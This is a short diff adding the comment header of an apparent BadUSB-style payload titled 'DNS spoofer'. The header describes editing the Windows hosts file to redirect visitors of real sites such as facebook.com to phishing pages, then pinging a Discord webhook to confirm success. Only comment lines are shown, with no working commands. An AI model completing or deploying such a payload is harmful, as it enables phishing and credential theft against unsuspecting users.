@@ -1,0 +1,6 @@
+REM Title: DNS spoofer
+REM Author: fitzfactor
+REM Description: Edits windows hosts file to send the user to various phishing pages when visiting the real site, (ex: facebook.com facebook.dotcom)
+REM Target: windows / linux
+
+REM send a request to discord webhook saying dnsspoff successfully enabled
